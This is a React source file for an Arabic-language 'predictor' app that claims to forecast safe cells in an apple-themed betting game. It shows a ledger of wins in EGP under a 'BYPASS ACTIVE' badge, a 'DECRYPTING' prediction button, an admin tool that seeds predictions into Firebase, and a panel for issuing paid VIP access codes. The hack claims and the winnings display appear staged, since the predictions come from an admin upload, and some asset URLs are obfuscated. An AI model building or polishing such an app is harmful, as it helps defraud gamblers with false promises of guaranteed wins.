              {/* Row grid: Single Level Prediction */}
              {Array.from({ length: 1 }).map((_, i) => {
                const levelIdx = selectedLevelIdx; 
                const currentOdd = PREDEFINED_ODDS[levelIdx];
                const rowSignals = predictionSignals[levelIdx] || Array(5).fill('EMPTY');
                
                // Determine row highlight state based on active healthy apples predicted
                const hasHealthyPredicted = rowSignals.includes('HEALTHY') && !isPredicting;

                return (
                  <motion.div 
                    key={levelIdx} 
                    animate={{
                      backgroundColor: hasHealthyPredicted 
                        ? 'rgba(239, 68, 68, 0.04)' 
                        : 'rgba(0, 0, 0, 0)'
                    }}
                    className={cn(
                      "flex items-center gap-3.5 py-1.5 px-2.5 rounded-2xl transition-all border border-transparent",
                      hasHealthyPredicted ? "border-red-500/10 shadow-[inner_0_1px_5px_rgba(239,68,68,0.05)]" : ""
                    )}
                  >
                    
                    {/* Left: Level Odds multiplier styled inside a futuristic LED meter */}
                    <div className="w-[52px] shrink-0 text-left flex items-center justify-start">
                      <span className={cn(
                        "text-[12px] font-mono font-black tracking-widest leading-none drop-shadow-[0_2px_10px_rgba(239,68,68,0.5)] transition-colors",
                        hasHealthyPredicted ? "text-red-400 font-extrabold" : "text-white/40"
                      )}>
                        {currentOdd.toFixed(2)}
                      </span>
                    </div>

                    {/* Right: 5 columns/cells inside highly responsive, adaptive grid */}
                    <div className="flex-grow grid grid-cols-5 gap-1.5 justify-items-center">
                      {rowSignals.map((type, col) => {
                        const isHealthy = type === 'HEALTHY';
                        const isRotten = type === 'ROTTEN';
                        const isEmpty = type === 'EMPTY';
                        
                        return (
                          <motion.div
                            key={col}
                            initial={false}
                            whileHover={{ scale: isPredicting ? 1 : 1.06 }}
                            animate={{
                              scale: (!isPredicting && isHealthy) ? [1, 1.08, 1.04] : 1,
                              borderColor: isPredicting 
                                ? 'rgba(239, 68, 68, 0.45)' 
                                : isHealthy
                                  ? 'rgba(239, 68, 68, 0.8)' 
                                  : isRotten
                                    ? 'rgba(239, 68, 68, 0.4)'
                                    : 'rgba(255, 255, 255, 0.08)',
                              backgroundColor: isHealthy
                                ? 'rgba(239, 68, 68, 0.15)'
                                : isRotten
                                  ? 'rgba(239, 68, 68, 0.08)'
                                  : 'rgba(5, 2, 10, 0.65)'
                            }}
                            className={cn(
                              "w-full aspect-square max-w-[44px] max-h-[44px] min-[400px]:max-w-[48px] min-[400px]:max-h-[48px] rounded-xl border flex items-center justify-center relative overflow-hidden transition-all shadow-[inset_0_2px_8px_rgba(0,0,0,0.8)] shrink-0 group/cell",
                              isHealthy ? "shadow-[0_0_15px_rgba(239,68,68,0.25)]" : ""
                            )}
                            id={`grid-cell-${levelIdx}-${col}`}
                          >
                            {/* Empty state ready marker: micro crosshairs rather than plain dot */}
                            {isEmpty && !isPredicting && (
                              <div className="absolute inset-0 flex items-center justify-center opacity-25 group-hover/cell:opacity-60 transition-opacity">
                                <div className="text-[9px] font-mono text-red-300 font-bold select-none">+</div>
                              </div>
                            )}

                            {/* Matrix digital codes loading effect */}
                            {isPredicting && (
                              <div className="absolute text-[8px] font-mono text-red-400/30 overflow-hidden leading-none select-none text-center">
                                {Math.floor(Math.random() * 9)}
                              </div>
                            )}

                            {/* Apple graphics inside high-tech bubble */}
                            {!isPredicting && !isEmpty && (
                              <motion.div
                                initial={{ scale: 0.5, opacity: 0 }}
                                animate={{ scale: 1, opacity: 1 }}
                                transition={{ 
                                  type: "spring", 
                                  stiffness: 260, 
                                  damping: 15,
                                  delay: levelIdx * 0.06 + col * 0.01
                                }}
                                className="absolute inset-0.5 flex items-center justify-center select-none rounded-lg"
                              >
                                {isHealthy ? (
                                  <div className="w-full h-full relative overflow-hidden flex items-center justify-center rounded-lg bg-gradient-to-b from-red-500/10 to-transparent">
                                    <motion.div
                                      animate={{ scale: [1, 1.05, 1], rotate: [0, 2, -2, 0] }}
                                      transition={{ repeat: Infinity, duration: 3, ease: "easeInOut" }}
                                      className="w-full h-full flex items-center justify-center"
                                    >
                                      <img 
                                        src={_dec("3j,3v,3v,3r,3u,29,1y,1y,3x,3k,3f,3g,3q,20,20,1x,3t,3h,1x,3i,3f,1y,3c,3r,3r,3n,3g,1x,3r,3p,3i")} 
                                        alt="Apple" 
                                        className="w-8 h-8 object-contain select-none drop-shadow-[0_0_15px_rgba(239,68,68,0.9)]" 
                                        referrerPolicy="no-referrer"
                                      />
                                    </motion.div>
                                    {/* Small check icon */}
                                    <div className="absolute bottom-0 right-0 w-3 h-3 bg-red-500 border border-white/25 rounded-full flex items-center justify-center shadow-lg">
                                      <Check className="w-2 h-2 text-white stroke-[4]" />
                                    </div>
                                  </div>
                                ) : (
                                  <div className="w-full h-full relative overflow-hidden flex items-center justify-center rounded-lg bg-gradient-to-b from-red-500/10 to-transparent">
                                    <motion.div
                                      animate={{ scale: [1, 1.03, 1] }}
                                      transition={{ repeat: Infinity, duration: 4, ease: "easeInOut" }}
                                      className="w-full h-full flex items-center justify-center"
                                    >
                                      <img 
                                        src={_dec("3j,3v,3v,3r,3u,29,1y,1y,3x,3k,3f,3g,3q,20,20,1x,3t,3h,1x,3i,3f,1y,3r,3q,3k,1x,3r,3p,3i")} 
                                        alt="Poisoned Apple" 
                                        className="w-7 h-7 object-contain select-none opacity-45 grayscale drop-shadow-[0_0_10px_rgba(239,68,68,0.4)]" 
                                        referrerPolicy="no-referrer"
                                      />
                                    </motion.div>
                                    {/* Red skull warning point */}
                                    <div className="absolute inset-0 border border-red-500/35 rounded-lg pointer-events-none" />
                                  </div>
                                )}
                              </motion.div>
                            )}
                          </motion.div>
                        );
                      })}
                    </div>
                  </motion.div>
                );
              })}
            </div>
          </div>
        </div>

        {/* Action Trigger Buttons: START and RESTART redesigned as a cockpit dashboard */}
          <div className="grid grid-cols-2 gap-4 select-none pt-2 relative">
            <motion.button 
              whileHover={!(isPredicting || cooldownTime > 0) ? { scale: 1.03, y: -2 } : {}}
              whileTap={!(isPredicting || cooldownTime > 0) ? { scale: 0.98 } : {}}
              onClick={startPrediction}
              disabled={isPredicting || cooldownTime > 0}
              className={cn(
                "relative overflow-hidden py-4.5 rounded-2xl font-black text-xs tracking-[0.2em] font-sans transition-all flex items-center justify-center gap-2.5 cursor-pointer shadow-xl",
                (isPredicting || cooldownTime > 0)
                  ? "bg-red-950/20 border border-red-500/15 text-red-400/40 cursor-not-allowed"
                  : "bg-gradient-to-r from-red-700 to-red-500 hover:from-red-600 hover:to-red-400 text-white border border-red-400/30 shadow-[0_8px_30px_rgba(239,68,68,0.35)]"
              )}
              id="start-pred-button"
            >
              {isPredicting ? (
                <>
                  <Activity className="w-4 h-4 animate-spin text-white" />
                  <span>DECRYPTING...</span>
                </>
              ) : cooldownTime > 0 ? (
                <>
                  <Lock className="w-4 h-4 text-red-400/60 stroke-[2.5] animate-pulse" />
                  <span>WAIT ({cooldownTime}s)</span>
                  {/* Cooldown progress bar underneath */}
                  <div className="absolute bottom-0 left-0 h-1 bg-red-500 transition-all duration-1000" style={{ width: `${(cooldownTime / 3) * 100}%` }} />
                </>
              ) : (
                <>
                  <Play className="w-4 h-4 text-white fill-white/10 stroke-[2.5]" />
                  <span>تشغيل التوقع</span>
                </>
              )}
            </motion.button>

            <motion.button 
              whileHover={{ scale: 1.03, y: -1 }}
              whileTap={{ scale: 0.98 }}
              onClick={resetPrediction}
              className="py-4.5 rounded-2xl bg-white/[0.02] hover:bg-white/[0.08] border border-white/10 text-white font-black text-xs tracking-[0.2em] font-sans transition-all flex items-center justify-center gap-2.5 cursor-pointer backdrop-blur-md"
              id="reset-pred-button"
            >
              <RefreshCcw className="w-4 h-4 text-red-400" />
              <span>إعادة التشغيل</span>
            </motion.button>
          </div>

          {/* Premium History List View wrapper (RETAINING listview inner loop logic exactly, updated container design) */}
          <div className="flex-grow bg-black/60 border border-red-500/15 rounded-[32px] p-5 flex flex-col justify-start shadow-[inset_0_4px_30px_rgba(0,0,0,0.8)] overflow-hidden relative min-h-[340px] backdrop-blur-md">
            
            {/* HUD Status Header line */}
            <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-500/20 to-transparent" />

            {/* Header Area */}
            <div className="flex items-center justify-between mb-4.5 px-1 select-none border-b border-red-500/10 pb-3.5">
              <div className="flex items-center gap-2">
                <Cpu className="w-4 h-4 text-red-400 animate-pulse" />
                <span className="text-[10px] font-black tracking-[0.16em] text-red-300 uppercase font-sans">LIVE SYSTEM SECURE LEDGER</span>
              </div>
              <span className="text-[8px] font-mono text-emerald-400/80 bg-emerald-500/10 px-2 py-0.5 rounded tracking-widest uppercase font-black">BYPASS ACTIVE</span>
            </div>

            {/* Columns Grid headers */}
            <div className="grid grid-cols-3 text-center text-[10px] uppercase tracking-wider text-red-400/50 font-black pb-2 px-1 border-b border-white/5 font-sans">
              <div className="text-left font-sans">معرف اللاعب</div>
              <div className="font-sans">مستندات الرهان</div>
              <div className="text-right font-sans">قيمة الأرباح</div>
            </div>

            {/* List entries (The dynamic listview the user wanted preserved perfectly!) */}
            <div className="flex-grow space-y-2.5 mt-3.5 overflow-y-auto custom-scrollbar" id="history-items-list text-sans">
              <AnimatePresence initial={false}>
                {betHistory.map((item) => (
                  <motion.div
                    key={item.uniqueKey || item.id}
                    layout
                    initial={{ 
                      opacity: 0, 
                      y: -30, 
                      scale: 0.85, 
                      backgroundColor: "rgba(239, 68, 68, 0.15)", 
                      borderColor: "rgba(239, 68, 68, 0.4)" 
                    }}
                    animate={{ 
                      opacity: 1, 
                      y: 0, 
                      scale: 1,
                      backgroundColor: "rgba(20, 4, 6, 0.55)",
                      borderColor: "rgba(239, 68, 68, 0.08)"
                    }}
                    exit={{ 
                      opacity: 0, 
                      y: 20, 
                      scale: 0.9, 
                      filter: "blur(2px)",
                      transition: { duration: 0.2 } 
                    }}
                    transition={{ 
                      type: "spring", 
                      stiffness: 280, 
                      damping: 18,
                      backgroundColor: { duration: 1.2, ease: "easeOut" },
                      borderColor: { duration: 1.2, ease: "easeOut" }
                    }}
                    className="grid grid-cols-3 py-3 px-3 border rounded-xl items-center font-mono text-xs text-center shadow-md transition-colors gap-1 border-white/5 hover:border-red-500/25 bg-black/40"
                  >
                    <div className="text-left text-white/95 font-bold tracking-wide flex items-center gap-1.5">
                      <span className="w-1.5 h-1.5 rounded-full bg-red-500/55" />
                      <span>{item.id}</span>
                    </div>
                    <div className="text-white/60 font-semibold">{item.betAmount.toLocaleString()} EGP</div>
                    <div className="text-right text-emerald-400 font-extrabold flex items-center justify-end gap-1 font-sans">
                      <span className="text-[10px] bg-emerald-500/10 px-1 py-0.5 rounded mr-1">WIN</span>
                      <span>+{item.winAmount.toLocaleString()} EGP</span>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
            
            {/* Visual telemetry sidebar status footer inside ledger */}
            <div className="mt-4 pt-3.5 border-t border-red-500/10 flex justify-between text-[8px] font-mono text-white/30 uppercase tracking-widest">
              <span>LEDGER RATE: 99.4%</span>
              <span>STABLE FEED NODE: #EG-01</span>
            </div>
          </div>

        </div>
      </div>
    );
  };

  // 5. REDESIGNED ADMIN MAINTENANCE PROTOCOL (Sleek Dark Control Unit)
  const renderMaintenance = () => (
    <div className="min-h-screen p-6 flex flex-col items-center justify-center max-w-md mx-auto text-center relative overflow-x-hidden bg-transparent font-sans">
      <div className="relative z-10 w-full bg-linear-to-b from-[#1c0305]/50 to-black border border-white/10 p-8 rounded-[36px] text-center shadow-2xl backdrop-blur-2xl">
        
        {/* Core Shield Emblem */}
        <div className="w-16 h-16 bg-red-500/15 rounded-2xl border border-red-500/30 flex items-center justify-center mb-6 mx-auto">
          <Activity className={cn("w-8 h-8 text-red-400", isMaintenanceActive ? "animate-pulse" : "")} />
        </div>
        
        <h2 className="text-2xl font-black text-white font-display mb-1 uppercase tracking-wider">SYSTEM CONSOLE</h2>
        <p className="text-red-400 text-[9px] font-mono tracking-widest uppercase mb-8 font-black">ADMIN REMOTE OVERLAY</p>
        
        <div className="space-y-6">
          {/* Active Maintenance toggle layout */}
          <div className="flex items-center justify-between p-5 bg-white/[0.01] border border-white/5 rounded-2xl text-left">
            <div>
              <span className="text-xs font-black text-white block uppercase tracking-wide font-display">Maintenance Protocol</span>
              <span className="text-[9px] text-white/40 uppercase tracking-widest font-mono mt-0.5 block">
                {isMaintenanceActive ? 'ACTIVE - LOCKED GATE' : 'INACTIVE - LIVE NETWORK'}
              </span>
            </div>
            <button 
              onClick={toggleMaintenance}
              className={cn(
                "w-12 h-7 rounded-full transition-all relative flex items-center px-1 shadow-inner",
                isMaintenanceActive ? "bg-red-500" : "bg-white/10 border border-white/15"
              )}
              id="admin-maintenance-switch"
            >
              <motion.div 
                animate={{ x: isMaintenanceActive ? 20 : 0 }}
                className="w-4.5 h-4.5 bg-white rounded-full shadow-lg"
              />
            </button>
          </div>

          {/* Predictor config uploader with correct Arabic details */}
          <div className="p-5 bg-white/[0.01] border border-white/5 rounded-2xl text-right space-y-4 relative shadow-inner">
            <div className="flex flex-col text-right">
              <span className="text-xs font-black text-white block">تحديث توقعات فايربيس</span>
              <span className="text-[9.5px] text-white/40 uppercase tracking-widest font-mono mt-1 font-bold">UPDATE DATABASE SEED</span>
            </div>
            
            <p className="text-[10px] text-white/40 text-right leading-relaxed font-sans" style={{ direction: 'rtl' }}>
              توليد وحفظ توقعات تفاعلية جديدة مباشرة في قاعدة بيانات الفايربيس (m11.json). سيقوم المستخدمون الذين يكتبون معرف الأدمن بالاطلاع عليها مباشرة عند الضغط على زر التفعيل.
            </p>

            <button 
              onClick={adminUploadPredictions}
              disabled={isAdminUploading}
              className={cn(
                "w-full py-3.5 rounded-xl font-black text-[11px] tracking-widest transition-all shadow-md flex items-center justify-center gap-1.5 uppercase font-display",
                isAdminUploading 
                  ? "bg-white/5 text-white/20 border border-white/5 cursor-not-allowed" 
                  : adminUploadSuccess 
                    ? "bg-emerald-500 text-black font-black" 
                    : "bg-white text-black hover:bg-white/95"
              )}
              id="admin-db-update-button"
            >
              {isAdminUploading ? (
                <>
                  <RefreshCcw className="w-3.5 h-3.5 animate-spin" />
                  <span>جاري المرفع...</span>
                </>
              ) : adminUploadSuccess ? (
                <>
                  <Check className="w-4 h-4 text-black stroke-[3.5]" />
                  <span>تم تحديث الفايربيس!</span>
                </>
              ) : (
                <span>تحديث التوقعات في Firebase</span>
              )}
            </button>
            
            {adminUploadSuccess && (
              <p className="text-[9px] text-emerald-400 text-center animate-pulse font-mono tracking-wide" style={{ direction: 'rtl' }}>
                تم حفظ التوقعات بنجاح في m11.json
              </p>
            )}
          </div>

          <button 
            onClick={() => setCurrentScreen('CONDITION')}
            className="w-full py-4 text-[10px] font-black text-red-400 hover:text-white border border-red-500/20 hover:border-white/20 rounded-xl hover:bg-red-500/10 transition-all tracking-[0.2em] font-display uppercase"
            id="admin-logout-button"
          >
            DISCONNECT OVERLAY
          </button>
        </div>
      </div>
    </div>
  );


  // 6. COMPLETELY CUSTOM VIP CODE MANAGEMENT ADMIN SCREEN
  const renderAdmin = () => {
    return (
      <div className="min-h-screen p-4 sm:p-6 pb-16 max-w-md mx-auto relative overflow-x-hidden bg-transparent font-sans select-none text-right">
        {/* Red Glow Spotlights */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-80 h-80 bg-red-650/10 rounded-full blur-[100px] pointer-events-none z-0" />
        <div className="absolute bottom-1/5 left-1/3 w-72 h-72 bg-red-650/5 rounded-full blur-[90px] pointer-events-none z-0" />

        <div className="relative z-10 space-y-6">
          
          {/* Header */}
          <div className="flex items-center justify-between py-4 border-b border-red-500/15">
            <button
              onClick={() => setCurrentScreen('CONDITION')}
              className="px-3 py-1.5 bg-white/5 hover:bg-white/10 text-white/70 hover:text-white rounded-lg border border-white/5 transition-all text-xs font-bold flex items-center gap-1 cursor-pointer"
            >
              <ArrowRight className="w-3.5 h-3.5" />
              <span>خروج</span>
            </button>

            <div className="text-right">
              <h2 className="text-lg font-black text-white tracking-wider font-display uppercase leading-none">
                لوحة تحكم <span className="text-red-500">الأكواد</span>
              </h2>
              <span className="text-[8px] text-red-500/60 tracking-widest uppercase font-mono mt-1 font-bold block">7ARFOUSH VIP PANEL</span>
            </div>
          </div>

          {/* Panel 1: Generate Code */}
          <div className="bg-black/75 border border-red-500/20 rounded-[28px] p-5 space-y-4 shadow-xl backdrop-blur-md relative overflow-hidden">
            <div className="absolute top-0 right-0 w-16 h-16 bg-red-500/5 rounded-full blur-xl pointer-events-none" />
            
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-mono text-red-500 font-extrabold px-1 rounded uppercase">GENERATOR</span>
              <h3 className="text-xs font-black uppercase text-white/95 font-sans tracking-wide">إنشاء مفتاح مرور جديد</h3>
            </div>

            <div className="space-y-3">
              {/* Input for key text */}
              <div className="space-y-1.5">
                <label className="text-[10px] text-white/45 block font-bold">أدخل نص كود المرور:</label>
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={generateRandomAdminCode}
                    className="px-3 bg-red-500/10 hover:bg-red-500 hover:text-white text-red-400 border border-red-500/20 rounded-xl transition-all font-mono text-xs font-bold cursor-pointer shrink-0"
                  >
                    توليد عشوائي
                  </button>
                  <input
                    type="text"
                    placeholder="مثال: HARF-7738-VIP"
                    value={adminCodeText}
                    onChange={(e) => setAdminCodeText(e.target.value)}
                    className="flex-1 bg-red-950/10 border border-red-500/20 focus:border-red-400 rounded-xl py-2.5 px-4 text-white placeholder:text-white/20 focus:outline-none transition-all font-mono text-center text-sm font-bold tracking-wider"
                  />
                </div>
              </div>

              {/* Selection for Duration */}
              <div className="space-y-2">
                <label className="text-[10px] text-white/45 block font-bold">اختر مدة صلاحية الكود:</label>
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { label: "30 دقيقة", value: 30 },
                    { label: "ساعة واحدة", value: 60 },
                    { label: "12 ساعة", value: 720 },
                    { label: "24 ساعة", value: 1440 },
                    { label: "7 أيام", value: 10080 },
                    { label: "مدى الحياة", value: 5256000 }
                  ].map(item => {
                    const isSelected = adminDuration === item.value;
                    return (
                      <button
                        key={item.value}
                        type="button"
                        onClick={() => setAdminDuration(item.value)}
                        className={cn(
                          "py-2 px-1 text-center rounded-lg text-[10px] font-bold transition-all border cursor-pointer",
                          isSelected
                            ? "bg-red-650 text-white border-red-500 shadow-[0_2px_8px_rgba(239,68,68,0.2)]"
                            : "bg-white/[0.02] text-white/50 border-white/5 hover:border-red-500/10 hover:text-white/80"
                        )}
                      >
                        {item.label}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Submit Code Button */}
              <button
                type="button"
                onClick={createAdminCode}
                disabled={isSavingAdminCode}
                className={cn(
                  "w-full py-3 rounded-xl font-black text-xs tracking-wider transition-all cursor-pointer relative overflow-hidden flex items-center justify-center gap-1.5 mt-2",
                  isSavingAdminCode
                    ? "bg-white/5 text-white/20 border border-white/5 cursor-not-allowed"
                    : "bg-gradient-to-r from-red-650 to-red-500 hover:from-red-500 hover:to-red-400 text-white shadow-lg"
                )}
              >
                {isSavingAdminCode ? (
                  <>
                    <RefreshCcw className="w-3.5 h-3.5 animate-spin" />
                    <span>جاري التفعيل بالحفظ...</span>
                  </>
                ) : (
                  <>
                    <Crown className="w-4 h-4 fill-white/10" />
                    <span>حفظ وتفعيل الكود بالسيرفر</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Panel 2: Code List */}
          <div className="bg-black/75 border border-red-500/20 rounded-[28px] p-5 space-y-4 shadow-xl backdrop-blur-md relative overflow-hidden">
            <div className="flex items-center justify-between">
              <button
                onClick={fetchAdminCodes}
                className="p-1.5 hover:bg-white/5 rounded-lg border border-white/5 transition-all text-white/60 hover:text-white cursor-pointer"
                title="تحديث القائمة"
              >
                <RefreshCcw className={cn("w-3.5 h-3.5", isLoadingAdminCodes ? "animate-spin" : "")} />
              </button>
              <div className="flex items-center gap-2">
                <span className="text-[9px] font-mono text-red-500 font-extrabold px-1 rounded bg-red-500/10 uppercase">ACTIVE_KEYS</span>
                <h3 className="text-xs font-black uppercase text-white/95 font-sans tracking-wide">الأكواد الفعالة ومفاتيح المرور</h3>
              </div>
            </div>

            <div className="space-y-3 max-h-[350px] overflow-y-auto pr-1">
              {isLoadingAdminCodes ? (
                <div className="py-12 flex flex-col items-center justify-center gap-2">
                  <RefreshCcw className="w-6 h-6 text-red-500 animate-spin" />
                  <span className="text-xs text-white/45 font-mono">LOADING DATABASE...</span>
                </div>
              ) : dbCodes.length === 0 ? (
                <div className="py-12 text-center border border-dashed border-white/5 rounded-2xl">
                  <span className="text-xs text-white/35 block font-sans">لا توجد أكواد نشطة في السيرفر حالياً</span>
                  <span className="text-[9px] text-red-500/40 font-mono tracking-widest mt-1 block uppercase">SERVER_EMPTY</span>
                </div>
              ) : (
                dbCodes.map(item => {
                  const durationMs = item.duration * 60 * 1000;
                  const elapsed = Date.now() - item.createdAt;
                  const isExpired = item.duration < 5000000 && elapsed >= durationMs;
                  const isActive = item.active && !isExpired;

                  // Expiry calculations
                  let expiryLabel = "";
                  if (item.duration >= 5000000) {
                    expiryLabel = "مدى الحياة";
                  } else {
                    const remainingMs = durationMs - elapsed;
                    if (remainingMs <= 0) {
                      expiryLabel = "منتهي";
                    } else {
                      const remMins = Math.ceil(remainingMs / 60000);
                      if (remMins > 60) {
                        const hours = Math.floor(remMins / 60);
                        const mins = remMins % 60;
                        expiryLabel = `متبقي ${hours}س و ${mins}د`;
                      } else {
                        expiryLabel = `متبقي ${remMins} دقيقة`;
                      }
                    }
                  }

                  return (
                    <div
                      key={item.key}
                      className={cn(
                        "p-3 rounded-xl border flex items-center justify-between gap-2 transition-all backdrop-blur-sm relative overflow-hidden",
                        isActive
                          ? "border-emerald-500/20 bg-emerald-500/[0.02]"
                          : "border-red-500/15 bg-red-500/[0.01]"
                      )}
                    >
                      {/* Left Side: Actions */}
                      <div className="flex items-center gap-1.5 shrink-0" style={{ direction: 'ltr' }}>
                        {/* Copy Code */}
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(item.code);
                            triggerToast("تم نسخ الكود بنجاح!", "success");
                          }}
                          className="p-2 bg-white/5 hover:bg-white/10 text-white/70 border border-white/5 rounded-lg transition-all cursor-pointer"
                          title="نسخ الكود"
                        >
                          <Copy className="w-3.5 h-3.5" />
                        </button>

                        {/* Toggle active state */}
                        <button
                          onClick={() => toggleAdminCodeActive(item.key, item.active)}
                          className={cn(
                            "py-1 px-2.5 text-[10px] font-black rounded-lg transition-all cursor-pointer border",
                            item.active
                              ? "bg-amber-500/10 hover:bg-amber-500 hover:text-black text-amber-400 border-amber-500/20"
                              : "bg-emerald-500/10 hover:bg-emerald-500 hover:text-black text-emerald-400 border-emerald-500/20"
                          )}
                          title={item.active ? "إيقاف مؤقت" : "تشغيل وتنشيط"}
                        >
                          {item.active ? "إيقاف" : "تنشيط"}
                        </button>

                        {/* Delete Button */}
                        <button
                          onClick={() => {
                            if (confirm(`هل أنت متأكد من رغبتك في حذف كود ${item.code} نهائياً؟`)) {
                              deleteAdminCode(item.key);
                            }
                          }}
                          className="p-2 bg-red-500/10 hover:bg-red-500 hover:text-white text-red-400 border border-red-500/20 rounded-lg transition-all cursor-pointer"
                          title="حذف نهائياً"
                        >
                          <Trash className="w-3.5 h-3.5" />
                        </button>
                      </div>

                      {/* Right Side: Info details */}
                      <div className="text-right space-y-0.5 min-w-0">
                        <span className="font-mono text-[11px] sm:text-xs font-black text-white block truncate select-all">
                          {item.code}
                        </span>
                        <div className="flex items-center gap-1.5 justify-end">
                          <span className={cn(
                            "text-[8.5px] font-black uppercase px-1 rounded",
                            isActive
                              ? "bg-emerald-500/10 text-emerald-400"
                              : "bg-red-500/10 text-red-400"
                          )}>
                            {isActive ? "نشط" : isExpired ? "منتهي" : "متوقف"}
                          </span>
                          <span className="text-[9px] text-white/40 font-mono tracking-wide">
                            • {expiryLabel}
                          </span>
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>

        </div>
      </div>
    );
  };


  return (
    <div className="min-h-screen bg-transparent text-white font-sans selection:bg-red-500/30 selection:text-white relative">
      <BackgroundSystem />
      <AnimatePresence mode="wait">
        <motion.div
          key={currentScreen}
          initial={{ opacity: 0, scale: 0.98 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0, scale: 0.98 }}
          transition={{ duration: 0.35, ease: [0.19, 1, 0.22, 1] }}
          className="min-h-screen relative z-10"
        >
          {currentScreen === 'SPLASH' && <RenderSplash onComplete={() => setCurrentScreen('LOGIN')} />}
          {currentScreen === 'LOGIN' && renderLogin()}
          {currentScreen === 'CONDITION' && renderCondition()}
          {currentScreen === 'LICENSE' && renderLicense()}
          {currentScreen === 'PREDICTION' && renderPrediction()}
          {currentScreen === 'MAINTENANCE' && renderMaintenance()}
          {currentScreen === 'ADMIN' && renderAdmin()}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
